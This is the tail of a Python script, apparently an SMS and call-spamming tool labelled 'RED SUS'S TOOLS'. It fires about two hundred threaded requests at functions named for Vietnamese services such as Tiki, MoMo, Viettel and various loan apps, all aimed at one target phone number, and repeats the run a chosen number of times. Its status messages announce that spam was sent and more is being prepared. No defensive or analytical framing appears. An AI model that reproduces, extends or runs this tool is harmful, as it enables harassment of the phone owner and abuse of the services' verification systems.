  threading.submit(call5,sdt)
  threading.submit(call9,sdt)
  threading.submit(concung,sdt)
  threading.submit(cafeland,sdt)
  threading.submit(moneydong,sdt)
  threading.submit(call10,sdt)
  threading.submit(funring,sdt)
  threading.submit(gotadi,sdt)
  threading.submit(call11,sdt)
  threading.submit(fptplay,sdt)
  threading.submit(vietid,sdt)
  threading.submit(ahamove,sdt)
  threading.submit(vieon1,sdt)
  threading.submit(tiki,sdt)
  threading.submit(apiv5,sdt)
  threading.submit(moca,sdt)
  threading.submit(gbay,sdt)
  threading.submit(tgdd,sdt)
  threading.submit(dkvt,sdt)
  threading.submit(viettel,sdt)
  threading.submit(BIBABO,sdt)
  threading.submit(SWIFT247,sdt)
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt)
  threading.submit(PHUCLONG,sdt)
  threading.submit(VIETLOTT,sdt)
  threading.submit(CONCUNG,sdt)
  threading.submit(GOTADI,sdt)
  threading.submit(VIETID,sdt)
  threading.submit(VAMO,sdt)
  threading.submit(OLDFACEBOOK,sdt)
  threading.submit(FUNRING,sdt)
  threading.submit(BIBABO,sdt)
  threading.submit(moneydong,sdt)
  threading.submit(VAYSIEUDE,sdt)
  threading.submit(CAYDENTHAN,sdt)
  threading.submit(ONCREDIT,sdt)
  threading.submit(VAYVND,sdt)
  threading.submit(findo,sdt)
  threading.submit(AHAMOVE,sdt)
  threading.submit(TV360,sdt)
  threading.submit(POPS,sdt)
  threading.submit(F88,sdt)
  threading.submit(TIENOI,sdt)
  threading.submit(DONGPLUS,sdt)
  threading.submit(VIEON,sdt)
  threading.submit(FPTPLAY,sdt)
  threading.submit(ALFRESCOS,sdt)
  threading.submit(PIZZAHUT,sdt)
  threading.submit(SELLY,sdt)
  threading.submit(KIDSPLAZA,sdt)
  threading.submit(ICANKID,sdt) 
  threading.submit(RIVIU,sdt)
  threading.submit(VOSO,sdt)
  threading.submit(THITRUONGSI,sdt)
  threading.submit(BATDONGSAN,sdt)
  threading.submit(KIOTVIET,sdt)
  threading.submit(BIBABO,sdt)
  threading.submit(SWIFT247,sdt)
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt)
  threading.submit(PHUCLONG,sdt)
  threading.submit(VIETLOTT,sdt)
  threading.submit(GOTADI,sdt)
  threading.submit(VAMO,sdt)
  threading.submit(OLDFACEBOOK,sdt)
  threading.submit(WINMART,sdt)
  threading.submit(FUNRING,sdt)
  threading.submit(THANTAIOI,sdt)
  threading.submit(THANTAIOI,sdt)
  threading.submit(AHAMOVE,sdt)
  threading.submit(CAYDENTHAN,sdt)
  threading.submit(CAFELAND,sdt)
  threading.submit(DAIHOCFPT,sdt)
  threading.submit(ONCREDIT,sdt)
  threading.submit(FINDO,sdt)
  threading.submit(MONEYVEO,sdt)
  threading.submit(VAYVND,sdt)
  threading.submit(LOSHIP,sdt)
  threading.submit(TUOITRE,sdt) 
  threading.submit(DONGPLUS,sdt)
  threading.submit(F88,sdt)
  threading.submit(TIENOI,sdt)
  threading.submit(VIETTELL,sdt)
  threading.submit(META,sdt)
  threading.submit(TAMO,sdt)
  threading.submit(MOMO,sdt)
  threading.submit(apiv3,sdt)
  threading.submit(apiv2,sdt)
  threading.submit(tgdd,sdt)
  threading.submit(apiv5,sdt)
  threading.submit(tiki,sdt)
  threading.submit(moca,sdt)
  threading.submit(gbay,sdt)
  threading.submit(vieon1,sdt)
  threading.submit(ahamove,sdt)
  threading.submit(call11,sdt)
  threading.submit(call1,sdt)
  threading.submit(call2,sdt)
  threading.submit(call4,sdt)
  threading.submit(call5,sdt)
  threading.submit(call9,sdt)
  threading.submit(zlpay,sdt)
  threading.submit(vntrip,sdt)
  threading.submit(pop,sdt)
  threading.submit(poy,sdt)
  threading.submit(alfres,sdt)
  threading.submit(tv360,sdt)
  threading.submit(loship,sdt)
  threading.submit(oldloship,sdt)
  threading.submit(fpt,sdt)
  threading.submit(f88,sdt)
  threading.submit(oldzalopay,sdt)
  threading.submit(thantaioi,sdt)
  threading.submit(oldsenmo,sdt)   
  threading.submit(ZALOPAY,sdt) 
  threading.submit(thantaioi,sdt)
  threading.submit(CAYDENTHAN,sdt)
  threading.submit(MONEYVEO,sdt)
  threading.submit(ONCREDIT,sdt)
  threading.submit(MOMO,sdt)
  threading.submit(spamcall7,sdt)
  threading.submit(SWIFT247,sdt)
  threading.submit(spamcall,sdt)
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt)
  threading.submit(tv360,sdt)
  threading.submit(y360,sdt)
  threading.submit(kingfood,sdt)
  threading.submit(mocha,sdt)
  threading.submit(viettel,sdt)
  threading.submit(myvt,sdt)
  threading.submit(vayvnd,sdt)
  threading.submit(dongpus,sdt)
  threading.submit(one,sdt)
  threading.submit(vieon,sdt)
  threading.submit(phar,sdt)
  threading.submit(fptshop,sdt)
  threading.submit(kiotviet,sdt)
  threading.submit(appota,sdt)
  threading.submit(meta,sdt)
  threading.submit(blu,sdt)
  threading.submit(tgdt,sdt)
  threading.submit(concung,sdt)
  threading.submit(money,sdt)
  threading.submit(winmart,sdt)
  threading.submit(pop,sdt)
  threading.submit(tamo,sdt)
  threading.submit(alf,sdt)
  threading.submit(one,sdt)
  threading.submit(piza,sdt)
  threading.submit(robot,sdt)
  threading.submit(phuc,sdt)
  threading.submit(emart,sdt)
  threading.submit(hana,sdt)
  threading.submit(med,sdt)
  threading.submit(ghn,sdt)
  threading.submit(shop,sdt)
  threading.submit(khia,sdt)
  threading.submit(robo,sdt)
  threading.submit(gala,sdt)
  threading.submit(apiurl,sdt)
  threading.submit(pops,sdt)
  threading.submit(vdh1,sdt)
  threading.submit(metavn,sdt)
  threading.submit(moneyveo,sdt)
  threading.submit(vdh2,sdt)
  threading.submit(vdh3,sdt)
  threading.submit(vdh4,sdt)
  threading.submit(vdh5,sdt)
  threading.submit(vdh7,sdt)
  threading.submit(vdh6,sdt)
  threading.submit(vdh8,sdt)
  threading.submit(vdh9,sdt)
  threading.submit(vdh10,sdt)
  threading.submit(vdh11,sdt)
  threading.submit(vdh12,sdt)
  threading.submit(vdh14,sdt)
  threading.submit(vdh13,sdt)
  threading.submit(vdh15,sdt)
  threading.submit(vdh16,sdt)
  threading.submit(vdh17,sdt)
  threading.submit(vdh18,sdt)
  threading.submit(vdh19,sdt)
  threading.submit(vdh20,sdt)
  threading.submit(vdh21,sdt)
  threading.submit(vdh22,sdt)
  threading.submit(vdh23,sdt)
  threading.submit(vdh24,sdt)
  print("[ RED SUS'S TOOLS ] Send SMS - Call | Delay : 5 | Trạng Thái : Thành Công ",)  
  for j in range(0, 5):
    # code trong vòng lặp
    print(f"[ RED SUS'S ] | ĐANG CHUẨN BỊ SPAM TIẾP \r",end="")
    
for i in range(1,count+1):
  run(sdt,i)
 
